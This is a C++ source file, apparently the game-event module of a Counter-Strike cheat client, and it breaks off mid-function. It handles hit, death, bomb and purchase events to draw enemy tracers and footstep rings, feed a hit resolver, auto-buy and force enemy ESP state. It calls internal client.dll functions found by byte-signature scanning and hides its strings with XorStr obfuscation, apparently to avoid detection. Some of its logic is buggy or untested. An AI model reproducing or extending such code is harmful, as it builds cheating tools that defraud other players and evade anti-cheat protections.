#include "GameEvent.hpp"
#include "../Visuals/EventLogger.hpp"
#include "../../source.hpp"
#include "../../Utils/FnvHash.hpp"
#include "../../SDK/Classes/Player.hpp"
#include "../Rage/LagCompensation.hpp"
#include <sstream>
#include "BulletBeamTracer.hpp"
#include "../Visuals/Hitmarker.hpp"
#include "AutoBuy.hpp"
#include "../../SDK/core.hpp"
#include "../Visuals/ESP.hpp"
#include "../Visuals/CChams.hpp"
#include "../Rage/ShotInformation.hpp"
#include "../Rage/Resolver.hpp"
#pragma comment(lib,"Winmm.lib")
#include "../Rage/TickbaseShift.hpp"
#include "../Visuals/IVEffects.h"
#include "walkbot.h"
#include "hitsounds.h"

#include <fstream>
#include <Shlwapi.h>
#pragma comment(lib, "shlwapi.lib")

#include "../../Loader/Security/Security.hpp"
#include "WeatherController.hpp"
#include "MusicPlayer.hpp"


#define ADD_GAMEEVENT(n)  Interfaces::m_pGameEvent->AddListener(this, XorStr(#n), false)

class C_GameEvent : public GameEvent {
public: // GameEvent interface
	virtual void Register( );
	virtual void Shutdown( );

	C_GameEvent( ) { };
	virtual ~C_GameEvent( ) { };
public: // IGameEventListener
	virtual void FireGameEvent( IGameEvent* event );
	virtual int  GetEventDebugID( void );
};

Encrypted_t<GameEvent> GameEvent::Get( ) {
	static C_GameEvent instance;
	return &instance;
}

const unsigned short INVALID_STRING_INDEX = (unsigned short)-1;
bool PrecacheModel_footsteps(const char* szModelName)
{
	INetworkStringTable* m_pModelPrecacheTable = Interfaces::g_pClientStringTableContainer->FindTable("modelprecache");

	if (m_pModelPrecacheTable)
	{
		Interfaces::m_pModelInfo->FindOrLoadModel(szModelName);
		int idx = m_pModelPrecacheTable->AddString(false, szModelName);
		if (idx == INVALID_STRING_INDEX)
			return false;
	}
	return true;
}

void C_GameEvent::Register( ) {
	ADD_GAMEEVENT( player_hurt );
	ADD_GAMEEVENT( bullet_impact );
	ADD_GAMEEVENT( player_footstep );
	ADD_GAMEEVENT( weapon_fire );
	ADD_GAMEEVENT( bomb_planted );
	ADD_GAMEEVENT( player_death );
	ADD_GAMEEVENT( round_start );
	ADD_GAMEEVENT( item_purchase );
	ADD_GAMEEVENT( bomb_begindefuse );
	ADD_GAMEEVENT( bomb_abortdefuse );
	ADD_GAMEEVENT( bomb_pickup );
	ADD_GAMEEVENT( bomb_beginplant );
	ADD_GAMEEVENT( bomb_abortplant );
	ADD_GAMEEVENT( item_pickup );
	ADD_GAMEEVENT( round_mvp );
	ADD_GAMEEVENT( grenade_thrown );
	ADD_GAMEEVENT( buytime_ended );
	ADD_GAMEEVENT( round_end );
	ADD_GAMEEVENT( round_prestart );
	ADD_GAMEEVENT( game_newmap );
	ADD_GAMEEVENT( bomb_beep );
	ADD_GAMEEVENT( bomb_defused );
	ADD_GAMEEVENT( bomb_exploded );
	ADD_GAMEEVENT( player_say );
	ADD_GAMEEVENT( cs_win_panel_match );
	ADD_GAMEEVENT( cs_match_end_restart );
	ADD_GAMEEVENT( match_end_conditions );
}

void C_GameEvent::Shutdown( ) {
	Interfaces::m_pGameEvent->RemoveListener( this );
}

void C_GameEvent::FireGameEvent( IGameEvent* pEvent ) {
	if( !pEvent )
		return;

	C_CSPlayer* LocalPlayer = C_CSPlayer::GetLocalPlayer( );
	if( !LocalPlayer || !Interfaces::m_pEngine->IsInGame( ) )
		return;

	auto event_hash = hash_32_fnv1a_const( pEvent->GetName( ) );
	auto event_string = std::string( pEvent->GetName( ) );

	Engine::C_ShotInformation::Get( )->EventCallback( pEvent, event_hash );
	g_Vars.globals.m_bLocalPlayerHarmedThisTick = false;

	auto HitgroupToString = [ ] ( int hitgroup ) -> std::string {
		switch( hitgroup ) {
		case Hitgroup_Generic:
			return XorStr( "generic" );
		case Hitgroup_Head:
			return XorStr( "head" );
		case Hitgroup_Chest:
			return XorStr( "chest" );
		case Hitgroup_Stomach:
			return XorStr( "stomach" );
		case Hitgroup_LeftArm:
			return XorStr( "left arm" );
		case Hitgroup_RightArm:
			return XorStr( "right arm" );
		case Hitgroup_LeftLeg:
			return XorStr( "left leg" );
		case Hitgroup_RightLeg:
			return XorStr( "right leg" );
		case Hitgroup_Neck:
			return XorStr( "neck" );
		}
		return XorStr( "generic" );
	};

	static auto sv_showimpacts_time = Interfaces::m_pCvar->FindVar( XorStr( "sv_showimpacts_time" ) );

	// Force constexpr hash computing 
	switch( event_hash ) {
	case hash_32_fnv1a_const( "game_newmap" ):
	{
		Engine::LagCompensation::Get( )->ClearLagData( );
		g_Vars.globals.m_bNewMap = true;
		g_Vars.globals.BobmActivityIndex = -1;

		for (auto hk : g_luagameeventmanager.get_gameevents(XorStr("game_newmap"))) hk.func(pEvent);
	}
	case hash_32_fnv1a_const( "bullet_impact" ):
	{
		auto ent = ( C_CSPlayer* )Interfaces::m_pEntList->GetClientEntity( Interfaces::m_pEngine->GetPlayerForUserID( pEvent->GetInt( XorStr( "userid" ) ) ) );

		bool bCameFromLocal = LocalPlayer && ent && LocalPlayer == ent;
		bool bCameFromEnemy = LocalPlayer && ent && ent->m_iTeamNum( ) != LocalPlayer->m_iTeamNum( );
		if( LocalPlayer && !LocalPlayer->IsDead( ) ) {

			float x = pEvent->GetFloat( XorStr( "x" ) ), y = pEvent->GetFloat( XorStr( "y" ) ), z = pEvent->GetFloat( XorStr( "z" ) );
			if( g_Vars.esp.beam_enabled ) {
				if( bCameFromLocal && g_Vars.esp.beam_local_enable ) {
					IBulletBeamTracer::Get( )->PushBeamInfo( { Interfaces::m_pGlobalVars->curtime, LocalPlayer->GetEyePosition( ), Vector( x, y, z ), Color( ), ent->EntIndex( ), LocalPlayer->m_nTickBase( ) } );
				}
				else if( bCameFromEnemy && g_Vars.esp.beam_enemy_enable ) {
					if( !ent->IsDormant( ) )
						IBulletBeamTracer::Get( )->PushBeamInfo( { Interfaces::m_pGlobalVars->curtime, ent->GetEyePosition( ), Vector( x, y, z ), Color( ), ent->EntIndex( ), -1 } );
				}
			}

			if( bCameFromLocal ) {
				int color[ 4 ] = { g_Vars.esp.server_impacts.r * 255, g_Vars.esp.server_impacts.g * 255, g_Vars.esp.server_impacts.b * 255, g_Vars.esp.server_impacts.a * 255 };

				if( g_Vars.misc.server_impacts_spoof ) // draw server impact
					Interfaces::m_pDebugOverlay->AddBoxOverlay( Vector( x, y, z ), Vector( -2, -2, -2 ), Vector( 2, 2, 2 ), QAngle( 0, 0, 0 ), color[ 0 ], color[ 1 ], color[ 2 ], color[ 3 ],
						sv_showimpacts_time->GetFloat( ) );

				using FX_TeslaFn = void(__thiscall*)(CTeslaInfo&);
				using FX_GunshipImpactFn = void(__cdecl*)(const Vector& origin, const QAngle& angles, float scale, int numParticles, unsigned char* pColor, int iAlpha);
				using FX_ElectricSparkFn = void(__thiscall*) (const Vector& pos, int nMagnitude, int nTrailLength, const Vector* vecDir);

				static FX_TeslaFn meme = (FX_TeslaFn)Memory::Scan(XorStr("client.dll"), XorStr("55 8B EC 81 EC ? ? ? ? 56 57 8B F9 8B 47 18"));
				static FX_GunshipImpactFn meme_2 = (FX_GunshipImpactFn)Memory::Scan(XorStr("client.dll"), XorStr("55 8B 6B 04 89 6C 24 04 8B EC 83 EC 58 89 4D C0"));
				static FX_ElectricSparkFn spark = (FX_ElectricSparkFn)Memory::Scan(XorStr("client.dll"), XorStr("55 8B EC 83 EC 3C 53 8B D9 89 55 FC"));

				if (g_Vars.esp.tesla_impact) {
					CTeslaInfo teslaInfo;
					teslaInfo.m_flBeamWidth = 1;
					teslaInfo.m_flRadius = 5;
					teslaInfo.m_vPos = Vector(x, y, z); //wherever you want it to spawn from, like enemy's head;
					teslaInfo.m_flTimeVisible = 0.75;
					teslaInfo.m_nBeams = 3;
					teslaInfo.m_pszSpriteName = XorStr("sprites/physbeam.vmt"); //physbeam

					teslaInfo.m_vColor.Init(1.f, 1.f, 1.f);
					teslaInfo.m_nEntIndex = ent->EntIndex();
					meme(teslaInfo);
				}

			}
		}

		for (auto hk : g_luagameeventmanager.get_gameevents(XorStr("bullet_impact"))) hk.func(pEvent);

		break;
	}
	case hash_32_fnv1a_const("player_footstep"):
	{

		auto entity = reinterpret_cast<C_CSPlayer*>(Interfaces::m_pEntList->GetClientEntity(Interfaces::m_pEngine->GetPlayerForUserID(pEvent->GetInt(XorStr("userid")))));

		if (!entity)
			return;

		if (entity->valid(true, true))
		{
			if (g_Vars.esp.footsteps) 
			{

				Color RGBColor = Color::imcolor_to_ccolor(g_Vars.esp.footsteps_color);

				if (!PrecacheModel_footsteps(XorStr("materials/sprites/physbeam.vmt")))
					return;

				BeamInfo_t info;

				info.m_nType = TE_BEAMRINGPOINT;
				info.m_pszModelName = XorStr("materials/sprites/physbeam.vmt");
				info.m_nModelIndex = Interfaces::m_pModelInfo->GetModelIndex(XorStr("materials/sprites/physbeam.vmt"));
				info.m_nHaloIndex = -1;
				info.m_flHaloScale = 3.0f;
				info.m_flLife = 2.0f;
				info.m_flWidth = g_Vars.esp.footsteps_thickness;
				info.m_flFadeLength = 1.0f;
				info.m_flAmplitude = 0.0f;
				info.m_flRed = RGBColor.r();
				info.m_flGreen = RGBColor.g();
				info.m_flBlue = RGBColor.b();
				info.m_flBrightness = RGBColor.a();
				info.m_flSpeed = 0.0f;
				info.m_nStartFrame = 0.0f;
				info.m_flFrameRate = 60.0f;
				info.m_nSegments = -1;
				info.m_nFlags = FBEAM_FADEOUT;
				info.m_vecCenter = entity->m_vecOrigin() + Vector(0.0f, 0.0f, 5.0f);
				info.m_flStartRadius = 5.0f;
				info.m_flEndRadius = g_Vars.esp.footsteps_radius;
				info.m_bRenderable = true;

				auto beam_draw = Interfaces::m_pRenderBeams->CreateBeamRingPoint(info);

				if (beam_draw)
					Interfaces::m_pRenderBeams->DrawBeam(beam_draw);
			}

		}

		for (auto hk : g_luagameeventmanager.get_gameevents(XorStr("player_footstep"))) hk.func(pEvent);

		break;
	}
	case hash_32_fnv1a_const( "round_end" ):
	{
		g_Vars.globals.BobmActivityIndex = -1;
		//IRoundFireBulletsStore::Get( )->EventCallBack( pEvent, 1, nullptr );

		for (auto hk : g_luagameeventmanager.get_gameevents(XorStr("round_end"))) hk.func(pEvent);


		break;
	}
	case hash_32_fnv1a_const( "round_freeze_end" ):
	{
		g_Vars.globals.BobmActivityIndex = -1;
		g_Vars.globals.IsRoundFreeze = false;
		for (auto hk : g_luagameeventmanager.get_gameevents(XorStr("round_freeze_end"))) hk.func(pEvent);
		break;
	}
	case hash_32_fnv1a_const( "round_prestart" ):
	{
		g_Vars.globals.BobmActivityIndex = -1;
		g_Vars.globals.IsRoundFreeze = true;
		for (auto hk : g_luagameeventmanager.get_gameevents(XorStr("round_prestart"))) hk.func(pEvent);
		break;
	}
	case hash_32_fnv1a_const( "bomb_beep" ):
	{
		for (auto hk : g_luagameeventmanager.get_gameevents(XorStr("bomb_beep"))) hk.func(pEvent);
		break;
	}
	case hash_32_fnv1a_const( "bomb_defused" ):
	{
		g_Vars.globals.BobmActivityIndex = -1;
		g_Vars.globals.bBombActive = false;
		for (auto hk : g_luagameeventmanager.get_gameevents(XorStr("bomb_defused"))) hk.func(pEvent);
		break;
	}
	case hash_32_fnv1a_const( "bomb_exploded" ):
	{
		g_Vars.globals.BobmActivityIndex = -1;
		g_Vars.globals.bBombActive = false;
		for (auto hk : g_luagameeventmanager.get_gameevents(XorStr("bomb_exploded"))) hk.func(pEvent);
		break;
	}
	case hash_32_fnv1a_const( "player_hurt" ):
	{
		auto enemy = pEvent->GetInt( XorStr( "userid" ) );
		auto attacker = pEvent->GetInt( XorStr( "attacker" ) );
		auto remaining_health = pEvent->GetString( XorStr( "health" ) );
		auto dmg_to_health = pEvent->GetInt( XorStr( "dmg_health" ) );
		auto hitgroup = pEvent->GetInt( XorStr( "hitgroup" ) );

		auto enemy_index = Interfaces::m_pEngine->GetPlayerForUserID( enemy );
		auto attacker_index = Interfaces::m_pEngine->GetPlayerForUserID( attacker );
		auto pEnemy = C_CSPlayer::GetPlayerByIndex( enemy_index );
		auto pAttacker = C_CSPlayer::GetPlayerByIndex( attacker_index );

		player_info_t attacker_info;
		player_info_t enemy_info;

		if( pEnemy && pAttacker && Interfaces::m_pEngine->GetPlayerInfo( attacker_index, &attacker_info ) && Interfaces::m_pEngine->GetPlayerInfo( enemy_index, &enemy_info ) ) {
			auto local = reinterpret_cast< C_CSPlayer* >( Interfaces::m_pEntList->GetClientEntity( Interfaces::m_pEngine->GetLocalPlayer( ) ) );
			auto entity = reinterpret_cast< C_CSPlayer* >( Interfaces::m_pEntList->GetClientEntity( Interfaces::m_pEngine->GetPlayerForUserID( pEvent->GetInt( XorStr( "userid" ) ) ) ) );

			if( !entity || !local )
				return;

			if( attacker_index != Interfaces::m_pEngine->GetLocalPlayer( ) ) {
				if( enemy_index == local->EntIndex( ) ) {
					if( g_Vars.esp.event_harm ) {
						std::stringstream msg;

						msg << XorStr( "harmed by " ) << std::string(attacker_info.szName).substr(0, 24) << XorStr( " for " ) << dmg_to_health << XorStr( " in " ) << HitgroupToString( hitgroup ).data( );

						ILoggerEvent::Get( )->PushEvent( msg.str( ), FloatColor( 255, 255, 255 ), true, XorStr( "" ) );
					}

					g_Vars.globals.m_bLocalPlayerHarmedThisTick = true;
				}
			}
			else {

				Engine::C_ShotInformation::Get()->m_ShotInfoLua.result = XorStr("hit");
				Engine::C_ShotInformation::Get()->m_ShotInfoLua.server_damage = dmg_to_health;
				Engine::C_ShotInformation::Get()->m_ShotInfoLua.server_hitbox = HitgroupToString(hitgroup).data();

				if( g_Vars.esp.event_dmg ) {
					std::stringstream msg;

					msg << XorStr( "hit " ) << std::string(enemy_info.szName).substr(0, 24) << XorStr( " for " ) << dmg_to_health << XorStr( " in " ) << HitgroupToString( hitgroup ).data( );

					ILoggerEvent::Get( )->PushEvent( msg.str( ), FloatColor( 255, 255, 255 ), true, XorStr( "" ) );
				}

				if (hitgroup == Hitgroup_Head && entity->m_vecVelocity().Length2D() < 0.1f) {
					Engine::g_ResolverData->hitPlayer[entity->EntIndex()] = true;
				}

				if( g_Vars.misc.hitsound ) {
					if (g_Vars.misc.hitsound_type == 3) {
						PlaySoundA(reinterpret_cast<char*>(hitsound_wav), nullptr, SND_ASYNC | SND_MEMORY);
					}
					else if (g_Vars.misc.hitsound_type == 2) {
						PlaySoundA(reinterpret_cast<char*>(bameware), nullptr, SND_ASYNC | SND_MEMORY);
					}
					else if( g_Vars.misc.hitsound_type == 1 ) {
						if (g_Vars.misc.custom_hitsound.c_str() != XorStr(""))
						{
							if (PathFileExists(g_Vars.misc.custom_hitsound.c_str())) {
								auto ReadWavFileIntoMemory = [&](std::string fname, BYTE** pb, DWORD* fsize) {
									std::ifstream f(fname, std::ios::binary);

									f.seekg(0, std::ios::end);
									int lim = f.tellg();
									*fsize = lim;

									*pb = new BYTE[lim];
									f.seekg(0, std::ios::beg);

									f.read((char*)*pb, lim);

									f.close();
								};

								DWORD dwFileSize;
								BYTE* pFileBytes;
								ReadWavFileIntoMemory(g_Vars.misc.custom_hitsound.c_str(), &pFileBytes, &dwFileSize);

								// danke anarh1st47, ich liebe dich
								// dieses code snippet hat mir so sehr geholfen https://i.imgur.com/ybWTY2o.png
								// thanks anarh1st47, you are the greatest
								// loveeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee
								// kochamy anarh1st47
								auto modify_volume = [&](BYTE* bytes) {
									int offset = 0;
									for (int i = 0; i < dwFileSize / 2; i++) {
										if (bytes[i] == 'd' && bytes[i + 1] == 'a'
											&& bytes[i + 2] == 't' && bytes[i + 3] == 'a')
										{
											offset = i;
											break;
										}
									}

									if (!offset)
										return;

									BYTE* pDataOffset = (bytes + offset);
									DWORD dwNumSampleBytes = *(DWORD*)(pDataOffset + 4);
									DWORD dwNumSamples = dwNumSampleBytes / 2;

									SHORT* pSample = (SHORT*)(pDataOffset + 8);
									for (DWORD dwIndex = 0; dwIndex < dwNumSamples; dwIndex++)
									{
										SHORT shSample = *pSample;
										shSample = (SHORT)(shSample * (g_Vars.misc.hitsound_volume / 100.f));
										*pSample = shSample;
										pSample++;
										if (((BYTE*)pSample) >= (bytes + dwFileSize - 1))
											break;
									}
								};

								if (pFileBytes) {
									modify_volume(pFileBytes);
									PlaySoundA((LPCSTR)pFileBytes, NULL, SND_MEMORY | SND_ASYNC);
								}
							}
						}
					}
					else {
						Interfaces::m_pSurface->PlaySound_( XorStr( "buttons\\arena_switch_press_02.wav" ) );
					}
				}

				if (entity->valid(true, true))
				{
					if (g_Vars.esp.footsteps)
					{

						Color RGBColor = Color::imcolor_to_ccolor(g_Vars.esp.footsteps_color);

						if (!PrecacheModel_footsteps(XorStr("materials/sprites/physbeam.vmt")))
							return;

						BeamInfo_t info;

						info.m_nType = TE_BEAMRINGPOINT;
						info.m_pszModelName = XorStr("materials/sprites/physbeam.vmt");
						info.m_nModelIndex = Interfaces::m_pModelInfo->GetModelIndex(XorStr("materials/sprites/physbeam.vmt"));
						info.m_nHaloIndex = -1;
						info.m_flHaloScale = 3.0f;
						info.m_flLife = 2.0f;
						info.m_flWidth = g_Vars.esp.footsteps_thickness;
						info.m_flFadeLength = 1.0f;
						info.m_flAmplitude = 0.0f;
						info.m_flRed = RGBColor.r();
						info.m_flGreen = RGBColor.g();
						info.m_flBlue = RGBColor.b();
						info.m_flBrightness = RGBColor.a();
						info.m_flSpeed = 0.0f;
						info.m_nStartFrame = 0.0f;
						info.m_flFrameRate = 60.0f;
						info.m_nSegments = -1;
						info.m_nFlags = FBEAM_FADEOUT;
						info.m_vecCenter = entity->m_vecOrigin() + Vector(0.0f, 0.0f, 5.0f);
						info.m_flStartRadius = 5.0f;
						info.m_flEndRadius = g_Vars.esp.footsteps_radius;
						info.m_bRenderable = true;

						auto beam_draw = Interfaces::m_pRenderBeams->CreateBeamRingPoint(info);

						if (beam_draw)
							Interfaces::m_pRenderBeams->DrawBeam(beam_draw);
					}

				}

				if (Hitmarkers::m_vecWorldHitmarkers.size()) {
					for (size_t i{ }; i < Hitmarkers::m_vecWorldHitmarkers.size(); ++i) {
						Hitmarkers::Hitmarkers_t& info = Hitmarkers::m_vecWorldHitmarkers[i];


						Hitmarkers::Hitmarkers_t& info_back = Hitmarkers::m_vecWorldHitmarkers.back();
						info_back.m_flDamage = dmg_to_health;
						info.ShouldDraw = true;
					}
				}
				Hitmarkers::AddScreenHitmarker( hitgroup == Hitgroup_Head ? Color( 0, 150, 255 ) : Color( 255, 255, 255 ) );
			}
		}


		for (auto hk : g_luagameeventmanager.get_gameevents(XorStr("player_hurt"))) hk.func(pEvent);


		break;
	}
	case hash_32_fnv1a_const( "item_purchase" ):
	{
		if( !g_Vars.esp.event_buy )
			return;

		auto userid = pEvent->GetInt( XorStr( "userid" ) );

		if( !userid )
			return;

		int index = Interfaces::m_pEngine->GetPlayerForUserID( userid );

		player_info_t info;

		auto player = C_CSPlayer::GetPlayerByIndex( index );
		auto local = C_CSPlayer::GetLocalPlayer( );

		if( !player || !local || player->IsTeammate( local ) )
			return;

		if( !Interfaces::m_pEngine->GetPlayerInfo( index, &info ) )
			return;

		std::stringstream msg;
		//msg << XorStr( "wpn: " ) << pEvent->GetString( XorStr( "weapon" ) ) << XorStr( " | " );
		//msg << XorStr( "money: " ) << std::string( XorStr( "$" ) ).append( std::to_string( player->m_iAccount( ) ) ).data( ) << XorStr( " | " );
		//msg << XorStr( "ent: " ) << info.szName;

		//ILoggerEvent::Get( )->PushEvent( msg.str( ), FloatColor( 255, 255, 255 ), true, XorStr( "buy" ) );

		for (auto hk : g_luagameeventmanager.get_gameevents(XorStr("item_purchase"))) hk.func(pEvent);

		break;
	}
	case hash_32_fnv1a_const( "bomb_begindefuse" ):
	{
		if( !g_Vars.esp.event_bomb || g_Vars.esp.event_bomb )
			return;

		auto userid = pEvent->GetInt( XorStr( "userid" ) );

		if( !userid )
			return;

		int index = Interfaces::m_pEngine->GetPlayerForUserID( userid );

		if( index == Interfaces::m_pEngine->GetLocalPlayer( ) )
			return;

		player_info_t info;

		if( !Interfaces::m_pEngine->GetPlayerInfo( index, &info ) )
			return;

		bool has_defuse = pEvent->GetBool( XorStr( "haskit" ) );

		std::stringstream msg;
		if( has_defuse )
			msg << XorStr( "act: " ) << XorStr( "started defusing (kit)" ) << XorStr( " | " );
		else
			msg << XorStr( "act: " ) << XorStr( "started defusing" ) << XorStr( " | " );

		msg << XorStr( "ent: " ) << info.szName;

		ILoggerEvent::Get( )->PushEvent( msg.str( ), FloatColor( 255, 255, 255 ), true, XorStr( "bomb" ) );

		g_Vars.globals.BobmActivityIndex = index;
		for (auto hk : g_luagameeventmanager.get_gameevents(XorStr("bomb_begindefuse"))) hk.func(pEvent);

		break;
	}
	case hash_32_fnv1a_const( "bomb_abortdefuse" ):
	{
		if( !g_Vars.esp.event_bomb || g_Vars.esp.event_bomb)
			return;

		auto userid = pEvent->GetInt( XorStr( "userid" ) );

		if( !userid )
			return;

		int index = Interfaces::m_pEngine->GetPlayerForUserID( userid );

		if( index == Interfaces::m_pEngine->GetLocalPlayer( ) )
			return;

		player_info_t info;

		if( !Interfaces::m_pEngine->GetPlayerInfo( index, &info ) )
			return;

		std::stringstream msg;
		msg << XorStr( "act: " ) << XorStr( "stopped defusing" ) << XorStr( " | " );
		msg << XorStr( "ent: " ) << info.szName;

		ILoggerEvent::Get( )->PushEvent( msg.str( ), FloatColor( 255, 255, 255 ), true, XorStr( "bomb" ) );

		g_Vars.globals.BobmActivityIndex = -1;
		for (auto hk : g_luagameeventmanager.get_gameevents(XorStr("bomb_abortdefuse"))) hk.func(pEvent);
		break;
	}
	case hash_32_fnv1a_const( "bomb_pickup" ):
	{
		if( !g_Vars.esp.event_bomb || g_Vars.esp.event_bomb)
			return;

		auto userid = pEvent->GetInt( XorStr( "userid" ) );

		if( !userid )
			return;

		int index = Interfaces::m_pEngine->GetPlayerForUserID( userid );

		if( index == Interfaces::m_pEngine->GetLocalPlayer( ) )
			return;

		player_info_t info;

		if( !Interfaces::m_pEngine->GetPlayerInfo( index, &info ) )
			return;

		std::stringstream msg;
		msg << XorStr( " act: " ) << XorStr( "picked up the bomb" ) << XorStr( " | " );
		msg << XorStr( "ent: " ) << info.szName;

		ILoggerEvent::Get( )->PushEvent( msg.str( ), FloatColor( 255, 255, 255 ), true, XorStr( "bomb" ) );

		for (auto hk : g_luagameeventmanager.get_gameevents(XorStr("bomb_pickup"))) hk.func(pEvent);

		break;
	}
	case hash_32_fnv1a_const( "bomb_beginplant" ):
	{
		if( !g_Vars.esp.event_bomb || g_Vars.esp.event_bomb)
			return;

		auto userid = pEvent->GetInt( XorStr( "userid" ) );

		if( !userid )
			return;

		int index = Interfaces::m_pEngine->GetPlayerForUserID( userid );

		if( index == Interfaces::m_pEngine->GetLocalPlayer( ) )
			return;

		player_info_t info;

		if( !Interfaces::m_pEngine->GetPlayerInfo( index, &info ) )
			return;

		std::stringstream msg;
		msg << XorStr( "act: " ) << XorStr( "started planting" ) << XorStr( " | " );
		msg << XorStr( "ent: " ) << info.szName;

		ILoggerEvent::Get( )->PushEvent( msg.str( ), FloatColor( 255, 255, 255 ), true, XorStr( "bomb" ) );

		g_Vars.globals.BobmActivityIndex = index;

		for (auto hk : g_luagameeventmanager.get_gameevents(XorStr("bomb_beginplant"))) hk.func(pEvent);

		break;
	}
	case hash_32_fnv1a_const( "bomb_abortplant" ):
	{
		if( !g_Vars.esp.event_bomb || g_Vars.esp.event_bomb)
			return;

		auto userid = pEvent->GetInt( XorStr( "userid" ) );

		if( !userid )
			return;

		int index = Interfaces::m_pEngine->GetPlayerForUserID( userid );

		if( index == Interfaces::m_pEngine->GetLocalPlayer( ) )
			return;

		player_info_t info;

		if( !Interfaces::m_pEngine->GetPlayerInfo( index, &info ) )
			return;

		std::stringstream msg;
		msg << XorStr( "act: " ) << XorStr( "stopped planting" ) << XorStr( " | " );
		msg << XorStr( "ent: " ) << info.szName;

		ILoggerEvent::Get( )->PushEvent( msg.str( ), FloatColor( 255, 255, 255 ), true, XorStr( "bomb" ) );

		g_Vars.globals.BobmActivityIndex = -1;

		for (auto hk : g_luagameeventmanager.get_gameevents(XorStr("bomb_abortplant"))) hk.func(pEvent);

		break;
	}
	case hash_32_fnv1a_const( "bomb_planted" ):
	{
		g_Vars.globals.bBombActive = true;
		for (auto hk : g_luagameeventmanager.get_gameevents(XorStr("bomb_planted"))) hk.func(pEvent);
		break;
	}
	case hash_32_fnv1a_const( "round_start" ):
	{
		g_Vars.globals.Fakewalking = g_Vars.misc.fakeduck_bind.enabled = false;
		g_TickbaseController.m_bSupressRecharge = false;
		Engine::WeatherController::Get()->ResetData();

		for( int i = 0; i < Interfaces::g_pDeathNotices->m_vecDeathNotices.Count( ); i++ ) {
			auto cur = &Interfaces::g_pDeathNotices->m_vecDeathNotices[ i ];
			if( !cur ) {
				continue;
			}

			cur->m_flStartTime = 0.f;
		}

		IAutoBuy::Get( )->Main( );

		for( size_t i = 1; i <= 64; i++ ) {
			IEsp::Get( )->SetAlpha( i );

			auto player = ( C_CSPlayer* )Interfaces::m_pEntList->GetClientEntity( i );
			if( !player || player == C_CSPlayer::GetLocalPlayer( ) || player->IsTeammate( C_CSPlayer::GetLocalPlayer( ) ) )
				continue;

			// hacky fix for dormant esp at start of round, i guess.
			// haven't tested this.
			player->m_iHealth( ) = 100;
		}

		g_Vars.globals.bBombActive = false;
		g_Vars.globals.BobmActivityIndex = -1;

		for (auto hk : g_luagameeventmanager.get_gameevents(XorStr("round_start"))) hk.func(pEvent);


		break;
	}
	case hash_32_fnv1a_const( "player_death" ):
	{
		int iUserID = Interfaces::m_pEngine->GetPlayerForUserID( pEvent->GetInt( XorStr( "userid" ) ) );
		int iAttacker = Interfaces::m_pEngine->GetPlayerForUserID( pEvent->GetInt( XorStr( "attacker" ) ) );
		auto iEnemyIndex = Interfaces::m_pEngine->GetPlayerForUserID( iUserID );
		auto player = C_CSPlayer::GetPlayerByIndex(iUserID);

		//if(iUserID == Interfaces::m_pEngine->GetLocalPlayer())
		//	walkbot::Instance().marker = walkbot::Instance().prishel = 0;

		C_CSPlayer* pAttacker = ( C_CSPlayer* )Interfaces::m_pEntList->GetClientEntity( iAttacker );
		if( pAttacker ) {
			if (iAttacker == Interfaces::m_pEngine->GetLocalPlayer() && iUserID != Interfaces::m_pEngine->GetLocalPlayer()) {
				Hitmarkers::AddScreenHitmarker(Color(255, 0, 0));
				if (Hitmarkers::m_vecWorldHitmarkers.size()) {
					for (size_t i{ }; i < Hitmarkers::m_vecWorldHitmarkers.size(); ++i) {
						Hitmarkers::Hitmarkers_t& info = Hitmarkers::m_vecWorldHitmarkers[i];
						info.ShouldDraw = true;
					}
				}

				if (g_Vars.misc.f12_kill_sound) {
					Interfaces::MusicPlayer::Instance()->play(XorStr("voice_input.wav"), 0.6f);
				}

				using FX_TeslaFn = void(__thiscall*)(CTeslaInfo&);
				using FX_GunshipImpactFn = void(__cdecl*)(const Vector& origin, const QAngle& angles, float scale, int numParticles, unsigned char* pColor, int iAlpha);
				using FX_ElectricSparkFn = void(__thiscall*) (const Vector& pos, int nMagnitude, int nTrailLength, const Vector* vecDir);

				static FX_TeslaFn meme = (FX_TeslaFn)Memory::Scan(XorStr("client.dll"), XorStr("55 8B EC 81 EC ? ? ? ? 56 57 8B F9 8B 47 18"));
				static FX_GunshipImpactFn meme_2 = (FX_GunshipImpactFn)Memory::Scan(XorStr("client.dll"), XorStr("55 8B 6B 04 89 6C 24 04 8B EC 83 EC 58 89 4D C0"));
				static FX_ElectricSparkFn spark = (FX_ElectricSparkFn)Memory::Scan(XorStr("client.dll"), XorStr("55 8B EC 83 EC 3C 53 8B D9 89 55 FC"));

				if (g_Vars.esp.tesla_kill) {
					CTeslaInfo teslaInfo;
					teslaInfo.m_flBeamWidth = g_Vars.esp.tesla_kill_width;
					teslaInfo.m_flRadius = g_Vars.esp.tesla_kill_radius;
					teslaInfo.m_vPos = player->GetEyePosition(); //wherever you want it to spawn from, like enemy's head;
					teslaInfo.m_flTimeVisible = g_Vars.esp.tesla_kill_time;
					teslaInfo.m_nBeams = g_Vars.esp.tesla_kill_beams;
					teslaInfo.m_pszSpriteName = XorStr("sprites/physbeam.vmt"); //physbeam

					Color RGBColor = Color::imcolor_to_ccolor(g_Vars.esp.tesla_kill_color);
					teslaInfo.m_vColor.Init(RGBColor.r() / 255.f, RGBColor.g() / 255.f, RGBColor.b() / 255.f);
					teslaInfo.m_nEntIndex = iUserID;
					meme(teslaInfo);
				}

				if (g_Vars.misc.killsound) {
					if (g_Vars.misc.custom_killsound.c_str() != XorStr(""))
					{
						if (PathFileExists(g_Vars.misc.custom_killsound.c_str())) {
							auto ReadWavFileIntoMemory = [&](std::string fname, BYTE** pb, DWORD* fsize) {
								std::ifstream f(fname, std::ios::binary);

								f.seekg(0, std::ios::end);
								int lim = f.tellg();
								*fsize = lim;

								*pb = new BYTE[lim];
								f.seekg(0, std::ios::beg);

								f.read((char*)*pb, lim);

								f.close();
							};

							DWORD dwFileSize;
							BYTE* pFileBytes;
							ReadWavFileIntoMemory(g_Vars.misc.custom_killsound.c_str(), &pFileBytes, &dwFileSize);

							// danke anarh1st47, ich liebe dich
							// dieses code snippet hat mir so sehr geholfen https://i.imgur.com/ybWTY2o.png
							// thanks anarh1st47, you are the greatest
							// loveeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee
							// kochamy anarh1st47
							auto modify_volume = [&](BYTE* bytes) {
								int offset = 0;
								for (int i = 0; i < dwFileSize / 2; i++) {
									if (bytes[i] == 'd' && bytes[i + 1] == 'a'
										&& bytes[i + 2] == 't' && bytes[i + 3] == 'a')
									{
										offset = i;
										break;
									}
								}

								if (!offset)
									return;

